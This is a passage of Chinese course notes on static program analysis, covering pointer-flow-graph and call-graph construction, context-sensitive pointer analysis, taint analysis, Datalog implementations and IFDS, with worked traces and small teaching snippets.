更新ptd为o3，c此时有后继d，需要增加&lt;d,o3&gt;到WL WL: &lt;a,o1&gt;,&lt;d,o3&gt; PFG: 接下来，当前分析的对象是c，由于存在c的load和store语句，需要进行field的加边 4处：c.f=a -&gt; addEdge(a,o3,f) addEdge(a,o3,f)：首先由于不存在a-&gt;o3.f的边，直接加上a-&gt;o3.f这条边 由于pta目前为空，跳过 WL：&lt;a,o1&gt;,&lt;d,o3&gt; 同理，6处：c.f=d -&gt; addEdge(d,c.f) addEdge(d,c.f) : 首先还是不存在d-&gt;c,f这样的一条 直接加上d-&gt;c,f 由于ptd目前为空 跳过 WL：&lt;a,o1&gt;,&lt;d,o3&gt; 目前PFG： 接下来继续处理WL 该到&lt;a,o1&gt;,&lt;d,o3&gt;了 这两个是一个类型 所以我就直接一起写了 &lt;a,o1&gt;：delta就是o1,pta加上o1， 这时候a的后继就是o3.f，需要向WL中增加&lt;o3.f,o1&gt; 由于没有a的field操作，所以跳 同理&lt;d,o3&gt;：delta就是o3,ptd需要加上o3 此时d的后继也是o3.f所以也需要向WL增加&lt;o3.f,o3&gt; 此时由于7处出现了e=d.f 是一个load语句，执行addEdge(o3.f,e) 需要加一条边 也就是o3.f-&gt;e WL：&lt;o3.f,o1&gt;，&lt;o3.f,o3&gt; PFG： 接下来解析&lt;o3.f,o1&gt;，delta是o1，所以把o1加入到o3.f的指针集里面 由于o3.f有后继e,因此也是需要把&lt;e,o1&gt;加入到指针集 接下来解析&lt;o3.f,o3&gt;，delta是o3，所以把o3加入到o3.f的指针集里面 由于o3.f有后继e,因此也是需要把&lt;e,o3&gt;加入到指针集 WL：&lt;e,o1&gt;&lt;e,o3&gt; PFG: 最后处理&lt;e,o1&gt;&lt;e,o3&gt;，分别就是向e的指针集里面增加两项o1,o3 最终PFG： 课后总结： 有人提问：流敏感指针分析有什么区别？ TT答：流敏感指针分析是在程序的特定运行位置维护一个指针集，对于Java来说开销极大并且benifit不明显，所以在Java业界主要还是流不敏感的指针分析。如果提升精度，主要选择上下文敏感的指针分析。 上述算法和WALA的实现比较像。 有人提问：PFG用途？ TT答：如果你想要追踪对象如何在指针之间流动的话，PFG可以帮你做到。 10指针分析处理函数调用构造调用图技术对比： CHA：基于声明类型，不精确，引入错误的调用边和指针关系。 指针分析：基于pt(a)，即a指向的类型，更精确，构造更准的CG并对指针分析有正反馈（所以过程间指针分析和CG构造同时进行，很复杂）。aka. on-the-fly call-graph construction 1234567void foo(A a) &#123; // pt(a) = ??? ... b = a.bar(); // pt(b) = ??? 把a的指向分析清楚了，就能确定a.bar()到底调用哪个对象的bar()函数，那么b的指向也明确了。 ... &#125; Call调用语句规则call语句规则：主要分为4步。 找目标函数m：Dispatch(oi, k)——找出pt(x)，也即oi类型对象中的k函数。 receiver object：把x指向的对象（pt(x)）传到m函数的this变量，即mthis 传参数：pt(aj), 1&lt;=j&lt;=n 传给m函数，即p(mpj), 1&lt;=j&lt;=n。建立PFG边，a1-&gt;mp1，…，an-&gt;mpn。 传返回值：pt(mret)传给pt(r)。建立PFG边，r &lt;- mret。 问题：为什么PFG中不添加x-&gt;mthis边？ 答：因为this只和自己这个对象相关，而可能有pt(x)={new A, new B, new C} 指定对象的x只流向对应的对象，是无法跨对象传递的。 连上这条this边，就会有很多错误的边。 参数没法决定receiver object是哪个 所以随便连 没关系的 过程间PTA算法问题：由于指针分析和CG调用图的构造互相依赖，所以每次迭代只分析可达的函数和语句。然后不断发现和分析新的可达函数。 方法：“一起做”。从main入口开始做，开始建边，分析可达性方法，不断挖掘。 对于某一段程序，仅仅分析他的可达性方法，reacheable世界，其余方法对于他来说都是“不存在”的 可达示例： 算法： 上下文不敏感 每个方法只统计一次 符号： m_entry：入口main函数 Sm：函数m中的语句 S：可达语句的集合（就是RM中的语句） RM：可达函数的集合 CG：调用图的边 理解： AddReachable就是拓展世界的函数，只有两处会调用： 程序入口点； 新的调用边被发现； 在新方法加入之后，先只看new和assign赋值语句，因为load和store是随着指针集的变化而变化，先研究也没有意义。 ProcessCall里面，x表示的是一个变量，是receiver object，oi表示的是流向x的某个新来的对象。 首先遍历与x有关的调用语句，先调用dispatch，取出真正的目标方法m 接下来将&lt;this,oi&gt;加入到worklist中，也就是将receiver object传递给this变量 l就是call site，m就是解出来的目标方法 如果l-m这条边在CG中没有的话，添加一条边 AddReachable拓展m方法 传递形参 传递返回值 问题：为什么ProcessCall(x, oi)中，要判断L-&gt;m这条边是否已经加入到CG？因为x可能指向多个对象，就会多次处理L这个调用指令，可能x中别的对象oj早就已经将这条边加入进去了。 AddReachable 拓宽可达性方法的世界 如果m不在可达方法合集中，m加入到RM，并且m方法中的语句(Sm)加入到所有可达方法(S) 对于Sm中出现的new语句：和PTA一样加入到WL中 对于Sm中出现的assign语句：x=y AddEdge(y,x) ProcessCall(x,oi) x是WL中&lt;n,pts&gt;中n所代表的变量，oi属于n指针集的变化 对于S中调用语句l: r = x.k(a1,...,an) 1 m = Dispatch(oi，k) 去解目标方法，也就是当前receiverObject是oi情况下，真正的方法 2 传this &lt;m.this,oi&gt;加入到WorkList中 如果l-&gt;m这条边不存在于CG中： 加上这条边 AddReachable(m) 将我们的m方法加入到可达方法的集合内 3 AddEdge(ai,pi) 传递参数 实参-&gt;形参 4 AddEdge(mret,r) 传递返回值 例子 WL 正处理 PFG 指针集 RM CG 语句 算法语句 1 [] {} {} {} 初始化 2 [] {A.main()} 1，2 AddReachable(mentry) 3 [&lt;a,{o3}&gt;, &lt;b,{o4}&gt;] 3，4 4 [&lt;b,{o4}&gt;] &lt;a,{o3}&gt; pt(a)={o3}； while开头 5 [] &lt;b,{o4}&gt; pt(b)={o4} while开头 6 [] 5 ProcessCall(b, o4) 7 [&lt;B.foo/this, {o4}&gt;] {5-&gt;B.foo(A)} m=Dispatch(o4, foo())=B.foo()；添加到调用图 8 [&lt;B.foo/this, {o4}&gt;, &lt;r, o11&gt;] {A.main(), B.foo()} AddReachable(B.foo())；添加到可达函数 9 [&lt;B.foo/this, {o4}&gt;, &lt;r, o11&gt;, &lt;y, {o3}&gt;] AddEdge()；添加参数边、返回值边 10 [&lt;r, o11&gt;, &lt;y, {o3}&gt;] &lt;B.foo/this, {o4}&gt; pt(B.foo/this)={o4}； while开头，B.foo/this没有调用任何函数 11 [&lt;y, {o3}&gt;, &lt;c, {o11}&gt;] &lt;r, o11&gt; pt(r)={o11}； while开头 12 &lt;y, {o3}&gt;, &lt;c, {o11}&gt; pt(y)={o3}；pt(c)={o11} while开头 如果是CHA的话，CG={5-&gt;B.foo(A), 5-&gt;A.foo(A)}，错误识别为调用边。 首先m[entry]当然是main方法了，RM中加入main，S中加入main方法的语句 main方法内出现了3、4两行的new，向WL中添加&lt;a,o3&gt;&lt;b,o4&gt; 进入到大循环，首先取出&lt;a,o3&gt;，delta为o3，propagate(a,o3)做了很多事，首先将a的指针集加入o3，加下来尝试寻找a的后继，但是目前还是没有，于是返回。回到外边，尝试寻到a的store/load相关的操作，未果，结束。 接下来轮到&lt;b,o4&gt;，delta为o4，propagate(b,o4)做了很多事，首先将b的指针集加入o4，加下来尝试寻找b的后继，但是目前还是没有，于是返回。回到外边，尝试寻到b的store/load相关的操作，未果，进入到ProcessCall。 ProcessCall(b,o4) 首先处理Dispatch的结果m就是B.foo(A)，接下来传this，WL里面传进去：&lt;B.foo/this,o4&gt; ，然后由于CG是空的，于是建立一条5-&gt;B.foo(A)的calledge。 这时候也就是说，我们的可达性方法里面出现了一个新的方法B.foo，因此需要用AddReachable(B.foo(A))方法。 AddReachable(B.foo(A))做了哪些事呢？首先，加RM集合，加Sm语句不多说了，接下来就是new 处理 assign两种语句。仅仅发现10行有一个new 将&lt;r,o11&gt;加入到WL中 接下来传递参数AddEdge(a,y)，进入AddEdge方法，建立PFG的边a-&gt;y， 由于a的指针集目前还有一个o3,那么就需要向WL中加入&lt;y,o3&gt; 最后传递返回值，AddEdge(r-&gt;c)，进而建立一条PFG的边r-&gt;c 进入下一次循环，取出&lt;B.foo/this,o4&gt;，delta就是o4，在PFG中，B.foo/this的指针集的内容就是o4，其他什么都不做。 下一个&lt;r,o11&gt;, 首先delta就是o11，r的指针集的内容添加一个o11，r的后继有c，于是WL中添加&lt;c,o11&gt; 目前WL中只有&lt;y,o3&gt;和&lt;c,o11&gt;。对于这两个，都是将y和c的指针集新增delta，其余什么都没做。 结果： 问题：没有入口函数的？如对库函数处理，生成调用库函数的程序。 理解4条rule： dispatch解目标方法，传this，传参数，传返回值 11上下文不敏感分析说明：上下文敏感分析是对指针分析的准确性提升最有效的技术。 问题：上下文不敏感时，分析常量传播这个问题，由于没有明确调用id()的上下文，会把不同的调用混在一起，对id函数内的变量n只有一种表示（没有对局部变量进行区分），导致n指向的对象集合增大，将i识别为非常量NAC。实际上，x.get()的值只来自于One()对象，i应该是常量1。 解决：根据调用的上下文（主要有3种：如根据调用点所在的行数——call-site sensitivity）来区分局部变量。 上下文敏感分析 C.S.概念： call-site sensitivity (call-string)：根据调用点位置的不同来区分上下文，3：id(n1) / 4：id(n2)。 Cloning-Based Context Sensitivity：每种上下文对应一个节点，标记调用者的行数。克隆多少数据，后面会讨论。 Context-Sensitive Heap：面向对象程序（如Java）会频繁修改堆对象，称为heap-insensitive。所以不仅要给变量加上下文，也要给堆抽象加上下文，称为heap context（本课程是基于allocate-site来进行堆抽象的）。 Context Insensitivity 上下文不敏感的原因： 在动态执行的过程中，一个方法可能在不同的上下文条件下被调用多次。 在不同的上下文过程中，方法的参数返回值也会指向不同的对象。 在上下文不敏感的分析中，不同上下文调用的参数会被混合，然后会将错误结果传播继续往下传播，造成不准确 会得到粒度更细的堆抽象 堆抽象上下文示例： 堆抽象+上下文不敏感：如果不区分8 ：X x = new X();调用的堆抽象的上下文，导致只有1个o8.f，把两个上下文调用产生的o8.f指向集合都合并了，得出了o8.f的错误指向的结果。 堆抽象+上下文敏感：用不同的调用者来区分堆抽象，如3:o8、4:o8是不同上下文创建的堆抽象。所以说，既要根据上下文的不同来区分局部变量，也要区分堆抽象，例如：3:p是给变量加上下文，3:o8是给堆抽象加上下文。 规则：变量上下文标号和堆上下文标号都是缺一不可的。谁敏感谁加行号区分，行号其实就是上下文环境。 上下文敏感指针分析：规则指针两种：变量 &amp; field 标记：根据调用者的行数来区分不同上下文，只要区分了函数、变量、堆对象，就能够区分实例域、上下文敏感的指针（变量+对象域）。C—上下文（暂时用调用点的行数表示），O—对象，F—对象中的域。 方法、变量、对象都需要上下文前缀 field不存在上下文，但是实例对象的object的Instance fields是有上下文前缀的 指针(上下文敏感指针的)指向的对象是有上下文前缀的 基本规则：跟之前区别不大，只是增加了个上下文标记，有细微区别。 很经典的一张图，值得细细品味。 解读： 首先l: r = x.k(a1,...,an)意思是在c上下文中，x所指向oi的对象，oi它的上下文为c’ 第二步，解析目标方法，依然是dispatch 多了一步，select 选择方法的上下文，对于目标函数m选择上下文，根据调用点的信息，获得不同上下文条件下的目标方法ct 传this：传的是ct上下文条件下m方法的this变量 传参数：也是在特定上下文方法下的参数，会区分开数据流 传返回值：从哪来，回哪里去。（不敏感就是到处瞎走，导致数据流混乱，敏感就是自己知道该回哪去） Context Sensitive Pointer Analysis：Algorithms区别：和过程间指针分析相比，仍然分为两个过程，分别是构造PFG和根据PFG传递指向信息。主要区别是添加了上下文。 PFG构造：边添加规则和之前一样，Assign、Store、Load、Call，Call需要加参数传递、返回值传递的边。 节点为上下文敏感的指针，每个节点都带有上下文的信息； 边：节点之间的关系，指针集的流向关系。 其实就是每个关键的上下文都需要记录下来 符号： S：可达语句的集合（就是RM中的语句） Sm：函数m中的语句 RM：可达函数的集合，带有上下文信息 CG：调用图的边，带有上下文信息 Context Sensitivity Variants 上下文Select函数选取规则上下文的选取主要采用3类： Call-Site Sensitivity Object Sensitivity Type Sensitivity … 说明：Select(c,l,c’:oi,m)，c—调用者上下文，l—调用者语句，c’:oi—接收对象（含堆的上下文信息）,m目标方法。 Call-site Sensitivity 对于一个正常函数的上下文，他会有很多callsite，这些callsite组合成一个chain，会有很多前驱的调用方法轨迹。 原理：又称为k-call-site sensitivity / k-CFA(Control-Flow Analysis)，不断添加调用行号。 Select(c,l,c’:oi,m) = (l’,…,l’’, l) 维护一个抽象调用栈。 问题：如果函数调用自身，导致无限递归，如何限制上下文长度？ 解决：k-limiting Context Abstraction。对上下文加以限制，只取最后k个上下文，通常取k&lt;=3。 例如，函数方法的上下文通常取2，堆上下文通常取1。 示例：采用1-Call-Site，省略heap上下文。 步骤： 初始化全部为空，接下来AddrReachable处理入口方法，上下文为空[]。首先入口方法为main方法，进到AddReachable之后，RM可达方法集合为{[]:C.main()}，WL中添加[&lt;[]:c,{o3}&gt;]注意是带有上下文的。接下来处理WL中的项，先做差集，o3加到带有上下文的指针集。这里没有load和store，走到processcall。进到processcall之后，select结果ct是4，代表是第四行进行了调用。接下来传递receiverobject，也就是[&lt;[4]:C.mthis,{o3}&gt;]放到WL中，表示将o3传递给4环境下的C类的this对象，接下来构建CG，也就是{[]:4-&gt;[4]:C.m()}表示在上下文为起始方法时，在第四行调用了C类的m方法，并且调用时候的上下文是4也就是在第四行调用的。接下来AddReachable，这时候RM可达方法集合为{[]:C.main(),[4].C.m()}，处理new语句，WL现状：[&lt;[4]:C.mthis,{o3}&gt;,&lt;[4]:n1,{o12}&gt;,&lt;[4]:n2,{o13}&gt;]表示在上下文为4的背景下，new出来了两个对象，分别在第12行和第13行创建。然后传参传返回值都是空，所以结束。 接下来处理WL中的下一个，应该是&lt;[4]:C.mthis,{o3}&gt;，首先propagate，算差集，this之前指针集还是空，那么o3就放到[4]:C.mthis的指针集里面。往下走，没有load和store，但是有两个方法调用，那么进入processcall，dispatch求得目标函数为m=C.id(Number)，上下文ct为[14]，往下走，先处理14行的上下文：构建CG调用边，CG目前现状：{[]:4-&gt;[4]:C.m(),[4]:14-&gt;[14]:C.id(Number)}，AddReachable将RM更新为{[]:C.main(),[4].C.m(),[14]:C.id(Number)}表示新添加的方法可达，接下来传参，[4]:n1-&gt;[14]:n表示n1参数作为实参传递给14行的形参；传返回值也类似：[14]:n-&gt;[4]:x表示14行的n作为返回值，传递给了4上下文下的x。接下来处理15行的上下文，m还是m=C.id(Number)，上下文ct为[15]，CG为：{[]:4-&gt;[4]:C.m(),[4]:14-&gt;[14]:C.id(Number),[4]:15-&gt;[15]:C.id(Number)}，RM为{[]:C.main(),[4].C.m(),[14]:C.id(Number),[15]:C.id(Number)} ，接下来传参，[4]:n2-&gt;[15]:n ，传返回值[15]:n-&gt;[4]:y 这也就是通过上下文将数据流分开。 接下来继续处理WL里面剩余的参数，该轮到&lt;[4]:n1,{o12}&gt;和&lt;[4]:n2,{o13}&gt;了 这里同理快进，其实就是把o12和o13接到了PFG上面，开始传播 当o12传递给x之后，执行x.get()方法调用 最终结果： &lt;img src=”../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20210413110839543.png” alt=”image-20210413110839543” style=”zoom:50%;” / WL 正处理 PFG 指针集 RM CG 处理语句 算法语句 1 {[]:C.main()} 3 AddReachable(mentry)—加入RM 2 [&lt;[]:c, {o3}&gt;] 3 AddReachable(mentry)—处理New 3 [] &lt;[]:c, {o3}&gt; pt([]:c) ={o3}； While开头，Propagate()—遍历WL更新指针 4 [⟨[4]:C.mthis, {o3}⟩] 4 ProcessCall()—this指针加入WL 5 [⟨[4]:C.mthis, {o3}⟩] {[ ]:4 → [4]:C.m()}； ProcessCall()——函数加入CG 6 [⟨[4]:C.mthis, {o3}⟩，⟨[4]:n1, {o12⟩，⟨[4]:n2, {o13⟩] 没有参数/返回值 {[]:C.main(), [4]:C.m()} 12,13 ProcessCall():AddReachable(m)处理m函数中的New 7 [⟨[4]:n1, {o12⟩，⟨[4]:n2, {o13⟩] ⟨[4]:C.mthis, {o3}⟩ pt([]:c) ={o3}；pt([4]:C.mthis)={o3}； While开头，Propagate()—遍历WL更新指针 8 [⟨[4]:n1, {o12⟩，⟨[4]:n2, {o13⟩] ProcessCall():处理m中的this调用 9 [⟨[4]:n1, {o12⟩，⟨[4]:n2, {o13⟩] 14 ProcessCall():Select(c,l,c’:oi)选择上下文ct=[14] 10 [⟨[4]:n1, {o12⟩，⟨[4]:n2, {o13⟩] {[]:C.main()， [4]:C.m()，[14]:C.id(Number)} {[ ]:4 → [4]:C.m()；[4]:14 → [14]:C.id(Number)}； ProcessCall():AddReachable([14]:C.id(Number)) 11 [⟨[4]:n1, {o12⟩，⟨[4]:n2, {o13⟩] [4]:n1→[14]:n→[4]:x； ProcessCall():AddEdge()参数边/返回值边 12 [⟨[4]:n1, {o12⟩，⟨[4]:n2, {o13⟩] [4]:n1→[14]:n→[4]:x；[4]:n2→[15]:n→[4]:y； {[]:C.main()， [4]:C.m()，[14]:C.id(Number)，[15]:C.id(Number)} {[ ]:4 → [4]:C.m()；[4]:14 → [14]:C.id(Number)，[4]:15 → [15]:C.id(Number)}； 15 ProcessCall()同理 13 [] [⟨[4]:n1, {o12⟩，⟨[4]:n2, {o13⟩] While开头—遍历WL更新指针 14 [] 16 While开头，ProcessCall()—处理x.get() 上下文不敏感vs上下文敏感（1-Call-Site）： 左边callsite不敏感会产生误报，认为16也会调用Two.get Object Sensitivity原理：针对面向对象语言，用receiver object来表示上下文。对比1层的调用点敏感和对象敏感，时间和准确性上对象敏感显然更优，这是由面向对象语言的特点所确定的。 Select(c,l,c’:oi,m) = [oj, … , ok, oi] （c’ = [oj, … , ok]） 示例：选取1-object，最终pt(x)=o3。 对比：对比1-Call-Site和1-object上下文，在这个示例中1-object明显更准确。原因是面向对象语言的特性，多态性产生很多继承链，一层一层调用子对象，其中最关键的是receiver object，receiver object决定了调用者的根源。本例有多层调用，若采用2-Call-Site就不会出错。 规律：this所指的变量一定是自己的上下文 示例2：在本示例中，1-Call-Site明显更准确。因为同一个receiver object用不同参数多次调用了子函数，导致局部变量无法区分。 结论：所以理论上，object敏感与callsite敏感的准确度无法比较。但是对于面向对象语言，object敏感的准确度和效率要明显优于callsite敏感。 Type Sensitivity原理：牺牲精度，提高速度。基于创建点所在类的类型，是基于对象敏感粗粒度的抽象，精度较低。 调用点所在的类型作为上下文； 总体对比精度：object &gt; type &gt; call-site 效率：type &gt; object &gt; call-site 本课老师提出选择上下文的方法，对代码的特点有针对性的选择上下文方法。 Java分析不需要流敏感，开销太大了，效果不明显。 12 &amp; 13显示流和隐藏信道，使用污点分析来检测信息流漏洞。 信息流安全访问控制：关注信息访问。但是程序获得信息之后去做了什么，访问控制监管不到。 信息流安全：关注信息传播。保证程序以安全的程序处理信息，防止泄露。 信息流：x-&gt;y表示x的值流向y。 信息等级：对不同变量进行分级，即安全等级，H-高密级，L-低密级。可以用格进行分类，给优先级排序。 安全策略：非干涉策略，高密级变量H的信息不能影响（流向）低密级变量L。 机密性和完整性保密性—信息泄露，读保护；完整性—信息篡改，写保护。 完整性错误类型：命令注入、SQL注入、XSS攻击、… 。都属于注入错误。 完整性更宽泛的定义：准确性、完整性、一致性。准确性表示关键数据不被不可信数据破坏；完整性表示系统存储了所有的数据；一致性表示发送的数据和接收的数据是一致的。 显示流和隐藏信道-Explicit Flows and Covert Channels显示流：直接用=数值传递。由于显示流能泄露更多信息，所以本课程关注显示流的信息泄露。 隐式信息流—侧信道：程序可能会以一些意想不到的方式泄露数据。 123456789101112131415// Eg1 隐式流if (secret_H &lt; 0) public_L = 1; else Public_L = 0;// Eg2 终止信道while(secret_H &lt; 0) &#123; ... &#125;;// Eg3 时间信道if (secret_H &lt; 0) for (int i = 0; i&lt; 1000000; ++i) &#123; ... &#125;;// Eg4 异常if (secret_H &lt; 0) throw new Exception(\"...\");// Eg5 如果访问数组越界，则可以推断secret可以为负数int sa_H[] = getSecretArray();sa_H[secret_H] = 0; Covert Channels：信道指的是传递信息的机制，convert_channel指的是那些原本目的不是为了传递信息的信道。 污点分析说明：使用最广的信息流分析技术，需将程序数据分为两类，把感兴趣的数据标记为污点数据。 核心：借助指针分析来传播污点数据，判断污点数据是否可以流到sink点中。 概念Sources &amp; Sink： Sources是污点数据的源，一般是某些方法的返回值，如read()； Sink是特定的程序点，某些敏感函数。 保密性：Source是秘密数据，Sink是泄露点，信息泄露漏洞。 完整性：Source是不可信数据，Sink是关键计算，注入漏洞。 污点分析具体规则定义：关注的是，一个污点数据是否能流向sink点。或者说，指向sink点处的指针会不会指向污点数据。 污点分析更关心数据，而不是变量，是对数据打标签。 TA/PTA对比：污点分析与指针分析，一个是污点数据的流向，一个是抽象对象的流向。 指针分析其实就是盯着程序中的抽象对象的流向， 思想： 可把污点数据看作是 特殊的对象 source看作这些对象的allocation-site 借助指针分析来实现污点分析 标记：ti表示调用点i(call site i)返回的污点数据，ti指针集就包含普通对象+污点数据。 规则： Source：先看CG图，如果程序有语句在l处调用了m方法，有调用边。条件是如果m属于分析的Source方法集合内，那么我们就把返回值标记为污点值tl，更新返回值r的指向。 Sink：在Sink的调用点检查就可以了。主要就是看调用点的调用目标方法，如果目标方法属于Sink集合，那么就开始检查参数，遍历参数，看参数他们的指针集。如果指针集之中发现了污点数据，那么就产生了TaintFlows，会报告说污点数据tj会流到m方法中。 示例：第3行产生新对象o11的同时，产生的污点数据t3；最终指针分析发现，t3会流向sink函数log()。 理解： 首先x指向o2，pw指向o11这个对象。由于getPassword方法是一个Source方法，那么就会触发处理source规则，会生成taint对象，上下文目前是在第三行，那么就是t3，加入到pw的指针集里面。 实现分析器用到：分析Java用Soot/WALA；分析C++用LLVM；有的用Datalog实现分析器（如DOOP分析框架）。 LLVM指针分析工具：SVF 14Datalog语法，如何利用Datalog实现指针分析和污点分析。 本节课内容讲到了很多数据逻辑方面的应用，单上数理逻辑会觉得理论性太强，单上这节课的应用知识又觉得理论上不够严谨，总之算是一种互补。 Motivation内容：了解命令式 vs 声明式语言，对比两种语言实现指针分析算法的优劣。 1234567891011// 问题：从一群人中挑出成年人。// 命令式语言(Imperative)：详细的命令机器怎么（How）去处理一件事情以达到你想要的结果（What）。如JavaSet&lt;Person&gt; selectAdults(Set&lt;Person&gt; persons) &#123; Set&lt;Person&gt; result = new HashSet&lt;&gt;(); for (Person person : persons) if (person.getAge() &gt;= 18) result.add(person); return result; &#125;// 声明式语言(Declarative)：只告诉你想要的结果（What），机器自己摸索过程（How）。如SQL，代码更简洁SELECT * FROM Persons WHERE Age &gt;= 18; 命令式语言—PTA：若采用命令式实现指针分析算法，实现复杂。需考虑worklist数据结构，是数组list还是链表，是先进先出还是先进后出；如何表示指针集合，hash集还是bit向量；如何关联PFG节点和指针；如何处理相关语句中的变量。 声明式语言—PTA：如何用声明式语言实现PTA？优点是简洁、可读性强、易于实现，例如Datalog。缺点是不方便表达复杂逻辑（Eg，for all全部满足）、不能控制性能。 Datalog介绍Datalog（Data + Logic）：是声明式逻辑编程语言，可读性强，最初用于数据库。现在可用于程序分析、大数据、云计算。特点—没有副作用、没有控制流、没有函数、非图灵完备（精简了许多功能）。 Data谓词，原子。 谓词Predicate：看作一系列陈述的集合，陈述某事情是不是事实（真假）。如Age表，表示一些人的年龄。 事实fact：特定值的组合。Eg，(“Xiaoming”, 18)。 原子Atom：P(X1, X2, ... , Xn)。P表示谓词名，Xi表示参数（又叫term，可以是变量或常量）。 Age(&quot;Xiaoming&quot;, 18) == true ； Age(&quot;Alan&quot;, 23) == false。 Logic(Rule)Rule：表示逻辑推导规则，若Body都为true，则Head为true。H &lt;- B1, B2, ... ,Bn。H是Head，Bi是Body。 Eg，Adult(person) &lt;- Age(person, age), age &gt;= 18。 Rule要求：规则中的值要有限，如A(x) &lt;- B(y), x &gt; y；规则不能有悖论，如A(x) &lt;- B(x), !A(x)。 Datalog中逻辑或：A或B都可推导出C，可写成C&lt;-A. C&lt;-B.或者C&lt;-A;B.，与的优先级高于或。 Datalog中逻辑非：!B(...)。 Datalog谓词分类EDB（extensional database）外延数据库：谓词需预先定义，关系不可变，可被当做输入。 IDB（intensional database）内涵数据库：谓词是根据规则建立的，关系是根据规则推导的，可被看作是是输出。 说明：H &lt;- B1, B2, ... ,Bn，H只能是IDB，Bi可以是EDB或IDB。 递归性：Datalog支持递归，也即能够推导出自身。 Eg， Reach(from, to) &lt;- Edge(from, to)； Reach(from, to) &lt;- Reach(from, node), Edge(node, to). Datalog程序运行Datalog程序运行：输入EDB+rules到Datalog引擎，输出IDB。常用Datalog引擎——LogicBlox, Soufflé, XSB, Datomic, Flora-2。 Datalog程序性质：单调性、终止性。 Datalog实现指针分析概念EDB：程序句法上可获得的指针相关信息。如New / Assign / Store / Load语句。V-变量，F-域，O-对象。 上下文不敏感PTA示例 步骤：其实指令处理顺序不固定。 首先将EDB（指令）表示成表格数据形式。 处理New指令 处理Assign指令 处理Store指令 处理Load指令 全程序指针分析-上下文敏感call指令规则：S—指令，M—方法。共3条rule。 VCall：就是表示callsite，调用指令上下文位置l，变量x，方法k； Dispatch：根据对象o，给定调用的方法k，去找到实际调用的方法m； ThisVar：获取实际调用的方法m中的this变量 Reachable：表示方法m可达 CallGraph：表示l到m有一条边，可达 首先找到调用的目标函数m，传递this指针。 传递参数 形参-&gt;实参-&gt;o 传返回值 三条规则的合影： 全程序指针分析：引入程序入口函数m。 Datalog实现污点分析EDB谓词-输入： Source(m : M) —— 产生污点源的函数 Sink(m : M) —— sink函数 Taint(l : S, t : T) —— 关联某callsite l和它产生的污点数据t IDB谓词-输出： TaintFlow(t : T, m : M) —— 表示污点数据t会流向sink函数m 规则：处理source和sink函数。 有的调用图有多个main入口方法，咋办？ 将多个入口函数都加入到EntryMethod(m)即可。 有没有datalog和传统结合的做法 如chord（java+Datalog实现） 15目标：以图可达性分析来进行程序分析，没有了数据流传播的过程。 Infeasible and Realizable Paths——基本概念Infeasible Paths：CFG中存在，但是实际动态运行中不会执行到的路径，如不匹配的调用返回边。这种路径可能会影响到程序分析的结果，但静态分析不能完全判定路径是否可达，会造成误报。 也就是说，如果CG上存在假边，那么静态分析时，dataflow会绕着假边来流动，造成误报。我们希望假边尽可能少，误报也就尽可能少。 Realizable Paths：跨函数调用产生的return边和对应的call-site的call边匹配，这样的path。它可能不会被执行。 目标：识别Realizable path，避免沿着Unrealizable path来传播数据分析。沿着对儿来匹配，从1来回到1，从2来回到2。 方法：CFL-Reachablity。 CFL-Reachablity（IFDS的理论基础，识别Realizable path）CFL-Reachablity：path连接A和B，或者说A能到达B，当且仅当path所有边的labels连接起来 是context-free language（CFL）中的一个word（或者说经过CFG语法变换之后可以得到该path word）。CFL是编译原理中的概念，遵循CFG语法。 简单来说：在边上添加label，那么一个路径realizable即这个路径上的边label组成了一个word，这个word是符合定义的上下文无关文法（CFG）的。 理解： S可以无条件滴替换为asb，也可以无条件地替换ɛ。 部分括号匹配问题（Partially Balanced-Parenthesis）：利用CFL来解决括号匹配问题，以识别Realizable path。 部分——有)i一定要有(i，反之有(i不一定要有)i，也即可以调用子函数而不返回。 对于每个调用点i，将其调用边加 (i 的标签，将其返回边加 )i的标签； 标记，调用边——(i；返回边——)i；其他边——e。 CFL-Reachablity：若path word（所有edge的label连起来组成的单词）可用CFL L(realizable)表示（可进行各种替换），则为Realizable Path。 示例如下，(1(2e)2)1(3就是边的label相连接形成的，绿色是可匹配的部分，realizable可被替换为matched realizable、(i realizable、ɛ。语法替换规则如下，这也是一个CFL语言示例： 示例： 看边就行了 IFDSIFDS含义： Interprocedural，Finite，Distributive，Subset - Problem Interprocedural—全程序分析 Finite—域有限（如live variables、definitions） Distributive—Transfer Function满足f(aub)=f(a)uf(b)，gen&amp;kill一类的都满足 Subset—子集问题，面向主流程序问题 图可达性 利用图可达性的程序分析框架：采用的操作——Meet-Over-All-Realizable-Paths（MRP），MRP比MOP更加精确，范围更小。 MOP对所有路径进行meet操作，MRP只对realizable path进行meet操作，更准确。 Supergraph（之前叫iCFG）&amp; Flow FunctionsIFDS步骤一：构造Supergraph说明：之前叫iCFG，给每个node定义transfer function；现在叫做supergraph，给每个edge定义transfer function。 Supergraph：G=(N, E*)。 G*包含所有的流图G1, G2, … （每个函数对应一个流图，本例对应Gmain和Gp）； 每个流图Gp都有个开始节点sp和退出节点ep； 每个函数调用包含调用节点Callp 和 返回节点Retp。 函数调用有3类边： 过程内call-to-return-site边，从Callp→Retp； 过程间call-to-start边，从Callp→sp（sp是被调用函数的开头）； 过程间exit-to-return-site边，从ep→Retp（ep是被调用函数的结尾）。 IFDS步骤一：设计流函数 flow functions 示例： call-to-callee把与callee直接相关信息传递进去，如用形参替换实参； exit-to-return边把形参相关信息剔除； call-to-return-site只传递局部变量，排除全局变量g，降低误报。全局变量已经传入到被调用函数进行处理了，全局变量是否被初始化取决于被调用函数。 例子: Exploded Supergraph and Tabulation AlgorithmIFDS步骤二：构造exploded supergraph G#Exploded SupergraphG#：将trans func转换成边的关系representation relations（graph），每个流函数变成了有2(D+1)个节点，边数最多(D+1)2，D表示dataflow facts元素个数（如待分析的变量个数）。G*中每个结点n被分解成D+1个结点，每条边n1→n2被分解成representation relation。 示例： （1）输入S是什么输出就是什么，1/3； （2）无论什么输入，都输出{a}，1/2； （3）b是无条件产生，所以0→b，a不能往下传了，b已经从0可达了就不用加b→b，c不受影响，也即无论有关a和b的事实之前是什么样，都不再重要； （4）b通过a得到所以a→b，不影响a、c的传递。注意，这里的值不是说变量在程序中真正的值是多少，而是说有关此变量的数据流事实的值是什么，如a的值可以为被初始化了和未被初始化两种，对应的集合即不包括和包括a。 问题：为什么需要0→0的边？以往数据流分析中，确定程序点（结点）p是否包含data fact a，是看a是否在OUT[p]中；IFDS中，是看&lt;smain, 